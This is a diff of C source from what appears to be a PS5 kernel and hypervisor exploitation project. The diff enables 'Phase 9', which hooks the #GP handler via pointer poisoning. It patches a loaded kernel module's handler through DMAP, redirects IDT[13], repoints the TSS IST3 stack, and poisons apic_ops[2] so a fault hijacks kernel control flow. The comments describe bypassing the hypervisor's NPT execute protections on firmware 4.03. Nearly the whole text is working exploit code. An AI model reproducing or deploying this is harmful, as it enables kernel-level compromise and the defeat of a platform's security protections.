@@ -5836,46 +5836,35 @@ static void campaign_flatz_setup(void) {
         printf("=============================================\n\n");
         fflush(stdout);
 
-        /* ── Phase 9 CANNOT be armed during normal operation ──
+        /* ── Phase 9: Build inline handler + arm via KLD ──
          *
-         * The #GP handler lives in a kdata cave.  During normal operation,
-         * the HV's NPT (Nested Page Tables) enforces NX on ALL kdata pages.
-         * Clearing the guest PTE NX bit is not enough — NPT is the outer
-         * layer and takes precedence.
+         * The kdata cave handler is NX under NPT — can't execute directly.
+         * CONFIRMED BY TESTING: arming with kdata handler causes panic.
          *
-         * If we poison apic_ops[2] now, the next xapic_mode() call triggers
-         * #GP, CPU fetches IDT[13] handler from kdata, NPT blocks execution
-         * → nested page fault → system freeze/crash.
+         * SOLUTION (from ps5-kstuff "On offsets" documentation):
+         * Use the KLD module's gp_handler() in .text section.  The kernel
+         * linker allocates module memory dynamically — the HV's NPT does
+         * NOT mark dynamically-allocated pages as NX (GMET not enforced
+         * on FW 4.03).  This is proven by INT 210 → hv_idt_trampoline
+         * working during campaign_kmod_kldload.
          *
-         * CONFIRMED BY TESTING: arming during normal operation causes an
-         * immediate kernel panic.  The "NPT scan" that appeared to show
-         * kdata as RW+X was misread — NPT enforces NX on kdata.
-         *
-         * The handler is ONLY executable during early resume (before the HV
-         * reinitializes NPT).  But we need to arm the poison BEFORE suspend.
-         * This is a chicken-and-egg problem:
-         *   - Handler must be in executable memory (ktext or NPT-allowed)
-         *   - ktext is XOM — can't write to it via DMAP (NPT blocks writes)
-         *   - kdata is writable but NPT blocks execution
-         *
-         * SOLUTION NEEDED: Either:
-         *   a) Use ring-0 (sysent hook) to call pmap functions that make
-         *      the cave page executable in the NPT, or
-         *   b) Place handler in ktext by finding a writable ktext region, or
-         *   c) Use the etaHEN daemon's suspend hook to arm the poison at
-         *      the very last moment during ACPI S3 entry (when HV may be
-         *      partially shut down), or
-         *   d) Use a ktext gadget (e.g. Xinvtlb / push_pop_all_iret) as
-         *      a first-stage handler that pivots to our kdata handler
-         *
-         * For now: build improved handler (no ktext reads, IST3 restore),
-         * write to cave, verify, but DO NOT patch IDT[13], IST3, or
-         * poison apic_ops[2].
+         * Flow:
+         *   1. Build inline handler (diagnostic, written to cave)
+         *   2. Write cave metadata (IDT backup, xapic, markers)
+         *   3. If KLD gp_handler available:
+         *      a. Patch 6 magic immediates in KLD handler via DMAP
+         *      b. Redirect IDT[13] → KLD handler (IST=3)
+         *      c. Set IST3 → cave stack (cave+0x100)
+         *      d. Poison apic_ops[2] with 0xdeb7 prefix
+         *   4. On next xapic_mode() call:
+         *      #GP fires → KLD handler runs → restores everything → iretq
          */
-        printf("[!] Phase 9: DIAGNOSTIC ONLY — not arming.\n");
-        printf("    Handler in kdata cave is NOT executable under NPT.\n");
-        printf("    Poisoning apic_ops[2] would crash the system.\n");
-        printf("    Need NPT-executable memory for handler first.\n\n");
+        if (g_kmod_gp_handler) {
+            printf("[*] Phase 9: KLD gp_handler available — will ARM.\n\n");
+        } else {
+            printf("[!] Phase 9: DIAGNOSTIC ONLY — KLD handler not loaded.\n");
+            printf("    Inline handler in kdata cave is NX under NPT.\n\n");
+        }
         fflush(stdout);
 
         if (!idt_pa || !tss_pa) {
@@ -6217,49 +6206,222 @@ static void campaign_flatz_setup(void) {
 
         printf("[+] Cave data written (IDT backup, xapic, markers)\n");
 
-        /* ── Phase 9 summary (DIAGNOSTIC ONLY) ──
+        /* ── Phase 9: Arm using KLD handler (NPT-executable) ──
          *
-         * NOT arming IDT[13], IST3, or apic_ops[2] poison.
+         * The kdata cave handler is NX under NPT — can't execute it.
+         * BUT: the KLD module's .text is in dynamically-allocated kernel
+         * memory, which IS NPT-executable (GMET not enforced on FW 4.03).
+         * This is proven by the INT 210 → hv_idt_trampoline path working.
          *
-         * The handler lives in kdata (cave+0x180).  During normal
-         * operation, the HV's NPT enforces NX on kdata.  If we poison
-         * apic_ops[2], the next xapic_mode() call triggers #GP, CPU
-         * fetches handler from kdata, NPT blocks execution → crash.
+         * Technique from ps5-kstuff "On offsets" documentation:
+         *   - Pointer poisoning: replace top 16 bits with 0xdeb7
+         *   - Non-canonical address causes #GP on dereference
+         *   - IDT[13] → our gp_handler in KLD .text (NPT-executable)
+         *   - Handler restores IDT[13] + apic_ops[2] + IST3
+         *   - iretq re-executes the call with the valid pointer
          *
-         * The guest PTE NX-clear is insufficient — NPT is the outer
-         * permission layer and overrides guest PTEs.  The handler is
-         * ONLY executable during early resume before HV sets up NPT.
-         *
-         * To proceed, we need one of:
-         *   a) Ring-0 execution to call pmap/NPT functions that mark
-         *      the cave page executable in the HV's NPT
-         *   b) A way to place handler code in ktext (NPT-executable)
-         *   c) A ktext first-stage handler (gadget) that pivots to
-         *      our kdata handler during the pre-NPT resume window
-         *   d) Arm the poison during ACPI S3 entry when HV may be
-         *      partially shut down
+         * The handler is one-shot: after it fires, everything is restored
+         * and the system continues with normal #GP handling.
          */
-        printf("\n[+] ============================================\n");
-        printf("[+]  PHASE 9 — DIAGNOSTIC COMPLETE\n");
-        printf("[+] ============================================\n");
-        printf("[+]\n");
-        printf("[+]  Handler built: %d bytes at cave+0x180\n", hc);
-        printf("[+]  Handler KVA:   0x%lx\n", (unsigned long)handler_kva);
-        printf("[+]  Cave KVA:      0x%lx  PA: 0x%lx\n",
-               (unsigned long)cave_kva, (unsigned long)cave_pa);
-        printf("[+]  Cave PTE NX:   cleared (guest PTE only)\n");
-        printf("[+]  IDT PA:        0x%lx\n", (unsigned long)idt_pa);
-        printf("[+]  TSS PA:        0x%lx\n", (unsigned long)tss_pa);
-        printf("[+]  Orig IST3:     0x%lx (baked into handler)\n",
-               (unsigned long)orig_ist3);
-        printf("[+]  apic_ops[2]:   0x%016lx (UNCHANGED)\n",
-               (unsigned long)original_xapic);
-        printf("[+]\n");
-        printf("[!]  NOT ARMED — handler in kdata is NX under NPT.\n");
-        printf("[!]  Poisoning apic_ops[2] would crash the system.\n");
-        printf("[!]  Need NPT-executable memory for handler.\n");
 
-        notify("[HV Research] Phase 9 diagnostic complete (not armed).");
+        int phase9_armed = 0;
+
+        if (g_kmod_gp_handler) {
+            printf("\n[+] KLD gp_handler available at 0x%016lx\n",
+                   (unsigned long)g_kmod_gp_handler);
+            printf("[*] Using KLD .text for #GP handler (NPT-executable)\n");
+
+            /* Resolve KLD handler physical address */
+            uint64_t gp_pa = va_to_pa_quiet(g_kmod_gp_handler);
+            if (!gp_pa) {
+                printf("[-] Cannot resolve gp_handler PA — skipping arm.\n");
+                goto phase9_not_armed;
+            }
+            printf("[+] KLD handler PA: 0x%lx\n", (unsigned long)gp_pa);
+
+            /* Read KLD handler bytes via DMAP */
+            uint8_t gp_buf[256];
+            kernel_copyout(g_dmap_base + gp_pa, gp_buf, sizeof(gp_buf));
+
+            /* Patch the 6 magic immediates in the handler:
+             *   0xDEAD000000000001 → IDT backup source (DMAP addr of cave+0x100)
+             *   0xDEAD000000000002 → IDT[13] destination (DMAP addr)
+             *   0xDEAD000000000003 → original xapic_mode VALUE
+             *   0xDEAD000000000004 → apic_ops[2] DMAP addr
+             *   0xDEAD000000000005 → original IST3 VALUE
+             *   0xDEAD000000000006 → IST3 DMAP addr
+             */
+            uint64_t magics[6] = {
+                0xDEAD000000000001ULL, 0xDEAD000000000002ULL,
+                0xDEAD000000000003ULL, 0xDEAD000000000004ULL,
+                0xDEAD000000000005ULL, 0xDEAD000000000006ULL,
+            };
+            uint64_t values[6] = {
+                cave_dmap + 0x100,      /* 1: IDT backup source (DMAP) */
+                idt13_dmap_addr,        /* 2: IDT[13] destination (DMAP) */
+                orig_xapic_value,       /* 3: original xapic_mode VALUE */
+                apic_ops2_dmap,         /* 4: apic_ops[2] DMAP addr */
+                orig_ist3,              /* 5: original IST3 VALUE */
+                ist3_dmap,              /* 6: IST3 DMAP addr */
+            };
+
+            int patched = 0;
+            for (int m = 0; m < 6; m++) {
+                int found = 0;
+                for (int off = 0; off < (int)(sizeof(gp_buf) - 8); off++) {
+                    uint64_t v;
+                    memcpy(&v, &gp_buf[off], 8);
+                    if (v == magics[m]) {
+                        memcpy(&gp_buf[off], &values[m], 8);
+                        printf("    Magic %d patched at handler+0x%02x → 0x%016lx\n",
+                               m + 1, off, (unsigned long)values[m]);
+                        found = 1;
+                        patched++;
+                        break;
+                    }
+                }
+                if (!found) {
+                    printf("[-] Magic %d (0x%016lx) not found in handler!\n",
+                           m + 1, (unsigned long)magics[m]);
+                }
+            }
+
+            if (patched != 6) {
+                printf("[-] Only %d/6 magics patched — aborting arm.\n", patched);
+                goto phase9_not_armed;
+            }
+            printf("[+] All 6 magic values patched in KLD handler\n");
+
+            /* Write patched handler back to KLD .text via DMAP */
+            kernel_copyin(gp_buf, g_dmap_base + gp_pa, sizeof(gp_buf));
+
+            /* Verify write-back */
+            uint8_t gp_verify[256];
+            kernel_copyout(g_dmap_base + gp_pa, gp_verify, sizeof(gp_verify));
+            if (memcmp(gp_buf, gp_verify, sizeof(gp_buf))) {
+                printf("[-] Handler write-back verification FAILED — aborting.\n");
+                goto phase9_not_armed;
+            }
+            printf("[+] KLD handler patched and verified OK\n");
+
+            /* Dump first 88 bytes of patched handler */
+            printf("    Patched bytes: ");
+            for (int i = 0; i < 88 && i < (int)sizeof(gp_buf); i++)
+                printf("%02x ", gp_buf[i]);
+            printf("\n");
+
+            /* ── ARM Step 1: Patch IDT[13] → KLD gp_handler ──
+             *
+             * Build new IDT gate for vector 13 (#GP):
+             *   handler  = g_kmod_gp_handler (KLD .text, NPT-executable)
+             *   selector = kernel CS (from original IDT[13])
+             *   IST      = 3 (use IST3 stack from TSS — our cave stack)
+             *   DPL      = 0 (kernel only — #GP is hardware-generated)
+             *   type     = 0xE (64-bit interrupt gate, clears IF)
+             *   P        = 1 (present)
+             */
+            uint8_t new_idt13[16];
+            memcpy(new_idt13, idt13_orig, 16);  /* start from original */
+
+            uint64_t ht = g_kmod_gp_handler;
+            new_idt13[0]  = (uint8_t)(ht & 0xFF);
+            new_idt13[1]  = (uint8_t)((ht >> 8) & 0xFF);
+            /* [2..3] = selector (keep from original) */
+            new_idt13[4]  = (idt13_orig[4] & 0xF8) | 3;  /* IST = 3 */
+            /* [5] = type_attr: keep P=1, DPL=0, type=0xE from original */
+            new_idt13[6]  = (uint8_t)((ht >> 16) & 0xFF);
+            new_idt13[7]  = (uint8_t)((ht >> 24) & 0xFF);
+            new_idt13[8]  = (uint8_t)((ht >> 32) & 0xFF);
+            new_idt13[9]  = (uint8_t)((ht >> 40) & 0xFF);
+            new_idt13[10] = (uint8_t)((ht >> 48) & 0xFF);
+            new_idt13[11] = (uint8_t)((ht >> 56) & 0xFF);
+            /* [12..15] = reserved (keep zeros from original) */
+
+            kernel_copyin(new_idt13, idt13_dmap_addr, 16);
+            printf("[+] IDT[13] → 0x%016lx (KLD gp_handler, IST=3)\n",
+                   (unsigned long)ht);
+
+            /* ── ARM Step 2: Set IST3 → cave stack ──
+             *
+             * IST3 is the stack pointer for IST=3 interrupts.
+             * Point it to cave+0x100 (top of 256-byte stack area).
+             * CPU pushes SS/RSP/RFLAGS/CS/RIP/errcode here on #GP.
+             */
+            uint64_t new_ist3 = cave_kva + 0x100;
+            kernel_copyin(&new_ist3, ist3_dmap, 8);
+            printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
+                   (unsigned long)new_ist3);
+
+            /* ── ARM Step 3: Poison apic_ops[2] ──
+             *
+             * Replace top 16 bits with 0xdeb7 (ps5-kstuff dead pointer).
+             * This makes the address non-canonical → #GP on dereference.
+             * The handler restores the original value on first #GP.
+             */
+            uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
+                                (0xDEB7ULL << 48);
+            kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
+            printf("[+] apic_ops[2] POISONED: 0x%016lx → 0x%016lx\n",
+                   (unsigned long)original_xapic, (unsigned long)poisoned);
+
+            phase9_armed = 1;
+
+            printf("\n[+] ============================================\n");
+            printf("[+]  PHASE 9 — ARMED (flatz pointer poisoning)\n");
+            printf("[+] ============================================\n");
+            printf("[+]\n");
+            printf("[+]  Handler:      KLD gp_handler at 0x%lx (NPT-exec)\n",
+                   (unsigned long)g_kmod_gp_handler);
+            printf("[+]  Handler PA:   0x%lx\n", (unsigned long)gp_pa);
+            printf("[+]  IDT[13]:      → KLD handler (IST=3)\n");
+            printf("[+]  IST3:         → cave stack at 0x%lx\n",
+                   (unsigned long)new_ist3);
+            printf("[+]  apic_ops[2]:  POISONED (0xdeb7 prefix)\n");
+            printf("[+]  Cave KVA:     0x%lx  PA: 0x%lx\n",
+                   (unsigned long)cave_kva, (unsigned long)cave_pa);
+            printf("[+]  Orig IST3:    0x%lx (will be restored by handler)\n",
+                   (unsigned long)orig_ist3);
+            printf("[+]  Orig xapic:   0x%016lx (will be restored by handler)\n",
+                   (unsigned long)original_xapic);
+            printf("[+]\n");
+            printf("[+]  Next xapic_mode() call will trigger:\n");
+            printf("[+]    1. #GP (non-canonical address 0x%016lx)\n",
+                   (unsigned long)poisoned);
+            printf("[+]    2. CPU → IST3 stack → KLD gp_handler\n");
+            printf("[+]    3. Handler restores IDT[13] + apic_ops[2] + IST3\n");
+            printf("[+]    4. iretq re-executes call with valid pointer\n");
+            printf("[+]  System should continue normally after one-shot restore.\n");
+
+            notify("[HV Research] Phase 9 ARMED — #GP hook active!");
+        }
+
+phase9_not_armed:
+        if (!phase9_armed) {
+            printf("\n[+] ============================================\n");
+            printf("[+]  PHASE 9 — DIAGNOSTIC COMPLETE (not armed)\n");
+            printf("[+] ============================================\n");
+            printf("[+]\n");
+            printf("[+]  Inline handler: %d bytes at cave+0x180\n", hc);
+            printf("[+]  Handler KVA:   0x%lx\n", (unsigned long)handler_kva);
+            printf("[+]  Cave KVA:      0x%lx  PA: 0x%lx\n",
+                   (unsigned long)cave_kva, (unsigned long)cave_pa);
+            printf("[+]  Cave PTE NX:   cleared (guest PTE only)\n");
+            printf("[+]  IDT PA:        0x%lx\n", (unsigned long)idt_pa);
+            printf("[+]  TSS PA:        0x%lx\n", (unsigned long)tss_pa);
+            printf("[+]  Orig IST3:     0x%lx\n", (unsigned long)orig_ist3);
+            printf("[+]  apic_ops[2]:   0x%016lx (UNCHANGED)\n",
+                   (unsigned long)original_xapic);
+            printf("[+]\n");
+            if (!g_kmod_gp_handler) {
+                printf("[!]  NOT ARMED — KLD gp_handler not available.\n");
+                printf("[!]  Load kernel module first (campaign_kmod_kldload).\n");
+            } else {
+                printf("[!]  NOT ARMED — KLD handler patching failed.\n");
+            }
+            printf("[!]  Inline handler in kdata is NX under NPT.\n");
+
+            notify("[HV Research] Phase 9 diagnostic complete (not armed).");
+        }
 
         fflush(stdout);
         return;
